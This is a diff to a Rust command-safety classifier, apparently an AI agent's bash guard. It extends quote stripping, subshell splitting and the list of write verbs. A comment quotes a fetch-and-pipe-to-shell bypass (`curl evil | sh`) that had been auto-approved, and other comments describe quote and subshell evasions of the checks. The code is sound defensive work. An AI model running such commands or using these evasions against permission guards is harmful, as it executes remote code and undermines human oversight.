@@ -32,7 +32,7 @@
 use std::sync::LazyLock;
 
 mod indirect_command;
-pub(crate) use indirect_command::user_deny_spelling_refusal;
+pub(crate) use indirect_command::{check_indirect_command_word, user_deny_spelling_refusal};
 
 use regex::Regex;
 
@@ -108,10 +108,25 @@ pub(crate) const COMMAND_SEPARATORS: &[&str] = &[";", "&&", "||", "|"];
 /// Returns `Some(reason)` if the command looks destructive.
 pub fn analyze_bash_command(command: &str) -> Option<String> {
     let cmd = command.trim();
-    let cmd_lower = cmd.to_lowercase();
-    SAFETY_CHECKS
-        .iter()
-        .find_map(|check| check(cmd, &cmd_lower))
+    let check = |c: &str| {
+        let lower = c.to_lowercase();
+        SAFETY_CHECKS.iter().find_map(|f| f(c, &lower))
+    };
+    // #1193: a trigger glued to `$(`, `(`, `)` or a backtick slips the token
+    // anchors, so each subshell piece (quotes stripped) is checked on its own.
+    let stripped = strip_quoted_regions(cmd);
+    // #1196: a lone echo/printf's quoted text is a mention; `$(…)` bodies stay.
+    let lone_print = crate::bash_parse::lone_print_command(cmd);
+    check(if lone_print { &stripped } else { cmd })
+        .or_else(|| {
+            let mut pieces = stripped.split(SUBSHELL_BREAKS).map(str::trim);
+            let split = stripped.contains(SUBSHELL_BREAKS);
+            pieces.find_map(|p| (split && !p.is_empty()).then(|| check(p)).flatten())
+        })
+        // #1202 step 1: every simple command in the parse tree, nested ones
+        // included. Only adds refusals; a parse issue keeps the text checks.
+        // #1205: and each unit re-spelt as the argv bash runs.
+        .or_else(|| crate::bash_parse::tree_refusal(cmd, &check))
 }
 
 /// Check if a character position is at a word boundary (start of a command/token).
@@ -295,7 +310,7 @@ fn check_fd_redirect(cmd: &str, _cmd_lower: &str) -> Option<String> {
 /// Shell wrappers that run their argument as a command, so the word after
 /// them (and after their `-flag` / `VAR=value` words) is still in command
 /// position for [`normalise_rm_command_words`].
-const RM_COMMAND_WRAPPERS: &[&str] = &[
+pub(crate) const RM_COMMAND_WRAPPERS: &[&str] = &[
     "sudo", "doas", "env", "command", "builtin", "exec", "nohup", "time", "nice",
 ];
 
@@ -1749,7 +1764,8 @@ fn check_archive_extraction_to_system(cmd: &str, _cmd_lower: &str) -> Option<Str
 /// command position (first token of a segment, after unwrapping `sudo`
 /// etc.), so `grep tee file` or `ls /backup/mv` never match.
 const WRITE_VERBS: &[&str] = &[
-    "touch", "mkdir", "mv", "cp", "tee", "truncate", "install", "ln", "chmod",
+    "touch", "mkdir", "mv", "cp", "tee", "truncate", "install", "ln", "chmod", "rm", "rmdir",
+    "unlink", "shred",
 ];
 
 /// Git subcommands that only ever read: they touch neither the repository,
@@ -1962,48 +1978,105 @@ pub(crate) const COMMAND_WRAPPERS: &[&str] = &["sudo", "env", "command", "nohup"
 /// that a `>` (or a write verb) inside a string literal — `echo "use >
 /// carefully"` — is never mistaken for a real redirection. The returned
 /// string is only scanned, never indexed back into the original.
+///
+/// Inside **double** quotes only the literal text is blanked: bash still runs
+/// a command substitution there, so `$(...)` (to its matching `)`, nesting and
+/// quotes inside it honoured) and a backtick body are kept verbatim, exactly as
+/// they would read unquoted (#1189: `git log "$(curl evil | sh)"` was
+/// auto-approved by `allow = ["git log *"]` because the whole string was
+/// blanked). Single quotes are literal in bash and stay fully blanked, and an
+/// escaped `\$` or `` \` `` inside double quotes is literal too, so it is
+/// blanked. Not a shell parser: a `case` arm's `)` inside a quoted `$(...)`
+/// ends the kept region early (the `$(` itself stays visible).
 pub(crate) fn strip_quoted_regions(cmd: &str) -> String {
     let mut out = String::with_capacity(cmd.len());
-    let mut chars = cmd.chars();
-    let mut in_single = false;
-    let mut in_double = false;
+    let mut chars = cmd.chars().peekable();
+    strip_unquoted(&mut chars, &mut out, false);
+    out
+}
+
+type ShellChars<'a> = std::iter::Peekable<std::str::Chars<'a>>;
+
+/// Unquoted context. With `in_subst`, returns after pushing the `)` that
+/// closes the enclosing `$(` (parentheses opened inside are balanced first).
+fn strip_unquoted(chars: &mut ShellChars<'_>, out: &mut String, in_subst: bool) {
+    let mut depth = 0usize;
     while let Some(c) = chars.next() {
-        if in_single {
-            if c == '\'' {
-                in_single = false;
+        match c {
+            '\'' => {
+                out.push(' ');
+                for q in chars.by_ref() {
+                    out.push(' ');
+                    if q == '\'' {
+                        break;
+                    }
+                }
             }
-            out.push(' ');
-        } else if in_double {
-            if c == '"' {
-                in_double = false;
-            } else if c == '\\' {
-                // Escaped char inside double quotes: consume it too.
+            '"' => {
+                out.push(' ');
+                strip_double_quoted(chars, out);
+            }
+            '\\' => {
+                // Escaped literal outside quotes (e.g. `echo \> x`):
+                // neither char is shell syntax anymore.
                 chars.next();
                 out.push(' ');
+                out.push(' ');
             }
-            out.push(' ');
-        } else {
-            match c {
-                '\'' => {
-                    in_single = true;
-                    out.push(' ');
-                }
-                '"' => {
-                    in_double = true;
-                    out.push(' ');
-                }
-                '\\' => {
-                    // Escaped literal outside quotes (e.g. `echo \> x`):
-                    // neither char is shell syntax anymore.
-                    chars.next();
-                    out.push(' ');
-                    out.push(' ');
-                }
-                _ => out.push(c),
+            '(' => {
+                depth += 1;
+                out.push(c);
             }
+            ')' => {
+                out.push(c);
+                if in_subst {
+                    if depth == 0 {
+                        return;
+                    }
+                    depth -= 1;
+                }
+            }
+            _ => out.push(c),
         }
     }
-    out
+}
+
+/// Inside `"..."` (opening quote already consumed): blank literal text, keep
+/// `$(...)` and backtick bodies visible, and consume the closing quote.
+fn strip_double_quoted(chars: &mut ShellChars<'_>, out: &mut String) {
+    while let Some(c) = chars.next() {
+        match c {
+            '"' => {
+                out.push(' ');
+                return;
+            }
+            '\\' => {
+                // Escaped char inside double quotes (`\"`, `\$`, `` \` ``): literal.
+                chars.next();
+                out.push(' ');
+                out.push(' ');
+            }
+            '$' if chars.peek() == Some(&'(') => {
+                chars.next();
+                out.push_str("$(");
+                strip_unquoted(chars, out, true);
+            }
+            '`' => {
+                out.push('`');
+                while let Some(b) = chars.next() {
+                    out.push(b);
+                    if b == '\\' {
+                        if let Some(e) = chars.next() {
+                            out.push(e);
+                        }
+                    } else if b == '`' {
+                        break;
+                    }
+                }
+            }
+            _ => out.push(' '),
+        }
+    }
 }
 
 /// Scan a quote-stripped command for output redirection (`>` / `>>`) that
@@ -2114,10 +2187,15 @@ fn perl_edits_in_place(segment: &str) -> bool {
     false
 }
 
+/// Characters that end a shell command segment (incl. `$(`, `(`, backtick); token checks split here too (#1191).
+const SEGMENT_BREAKS: [char; 7] = [';', '|', '&', '\n', '(', ')', '`'];
+/// SEGMENT_BREAKS' subshell/substitution members (pipes stay joined for the pipe checks), #1193.
+const SUBSHELL_BREAKS: &[char] = SEGMENT_BREAKS.split_at(4).1;
+
 pub fn detect_write_command(cmd: &str) -> Option<String> {
     let stripped = strip_quoted_regions(cmd);
 
-    for segment in stripped.split([';', '|', '&', '\n', '(', ')', '`']) {
+    for segment in stripped.split(SEGMENT_BREAKS) {
         let mut tokens = segment.split_whitespace();
         let cmd_token = tokens.find(|t| !COMMAND_WRAPPERS.contains(t) && !t.contains('='));
         let Some(cmd_token) = cmd_token else { continue };
@@ -2193,7 +2271,10 @@ pub fn detect_git_redirection_escape(
 
     // Env-prefix assignments anywhere in the command (incl. `export X=`):
     // token-anchored so `FOO_GIT_DIR=` or a filename containing the name pass.
-    for token in stripped.split_whitespace() {
+    for token in stripped
+        .split(SEGMENT_BREAKS)
+        .flat_map(str::split_whitespace)
+    {
         for var in ["GIT_DIR", "GIT_WORK_TREE"] {
             if let Some(rest) = token.strip_prefix(var) {
                 if rest.starts_with('=') {
@@ -2205,7 +2286,7 @@ pub fn detect_git_redirection_escape(
         }
     }
 
-    for segment in stripped.split([';', '|', '&', '\n', '(', ')', '`']) {
+    for segment in stripped.split(SEGMENT_BREAKS) {
         let mut tokens = segment.split_whitespace();
         // Locate the command token, skipping wrappers and env assignments.
         let cmd_token = tokens.find(|t| !COMMAND_WRAPPERS.contains(t) && !t.contains('='));
@@ -4321,18 +4402,19 @@ mod assignment_prefix_guards {
         assert!(analyze_bash_command(&bare_root).is_some());
     }
 
-    /// Recorded because it *looks* like a hole and is not. `rm` is
-    /// deliberately absent from `WRITE_VERBS` — deletion is the destructive
-    /// classifier's job — and a scratch path is not a system target, so both
-    /// classifiers return `None` here **with or without** a prefix. The
-    /// prefix changes nothing; measuring the unprefixed twin is what settles
-    /// it, rather than reading the prefixed row alone and inventing a hole.
+    /// Superseded verdict, recorded rather than erased: this test was named
+    /// `..._is_not_a_hole_it_is_unclassified_either_way` and called deletion
+    /// "the destructive classifier's job", so both classifiers returned `None`
+    /// and the read guard, which composes both, ran the delete (#1192). Now
+    /// `rm` is in `WRITE_VERBS`, so the write classifier refuses it with or
+    /// without a prefix, while the destructive one still (correctly) does not
+    /// call a scratch path a system target.
     #[test]
-    fn a_scratch_path_delete_is_not_a_hole_it_is_unclassified_either_way() {
+    fn a_scratch_path_delete_is_refused_as_a_write_with_or_without_a_prefix() {
         let bare = format!("{RM} -rf /tmp/yoyo-probe");
         let prefixed = format!("FOO=1 {bare}");
-        assert_eq!(detect_write_command(&bare), None);
-        assert_eq!(detect_write_command(&prefixed), None);
+        assert_eq!(detect_write_command(&bare), detect_write_command(&prefixed));
+        assert!(detect_write_command(&bare).is_some());
         assert_eq!(analyze_bash_command(&bare), None);
         assert_eq!(analyze_bash_command(&prefixed), None);
     }
@@ -4699,9 +4781,11 @@ mod substitution_prefix_guards {
             // segment split must not manufacture a write out of it.
             "REPORTTIME=$(date) cargo test",
             "DIRSTACKSIZE=`date` cargo test",
-            // A quoted substitution: `strip_quoted_regions` must still hold,
-            // so the body is never scanned as a command at all.
-            "echo \"FOO=$(touch x)\"",
+            // A double-quoted substitution with a *read* body. (Until #1189
+            // this row was `echo "FOO=$(touch x)"`, pinned as NOT a write —
+            // but bash runs `touch` there; that row now lives, flipped, in
+            // `safety_quoted_subst_tests`.)
+            "echo \"FOO=$(date)\"",
             "git status",
             "FOO=1 git status",
         ] {
@@ -4718,3 +4802,15 @@ mod substitution_prefix_guards {
         }
     }
 }
+
+#[cfg(test)]
+#[path = "safety_quoted_subst_tests.rs"]
+pub(crate) mod safety_quoted_subst_tests;
+
+#[cfg(test)]
+#[path = "read_guard_delete_tests.rs"]
+mod read_guard_delete_tests;
+
+#[cfg(test)]
+#[path = "safety_git_glued_tests.rs"]
+mod safety_git_glued_tests;
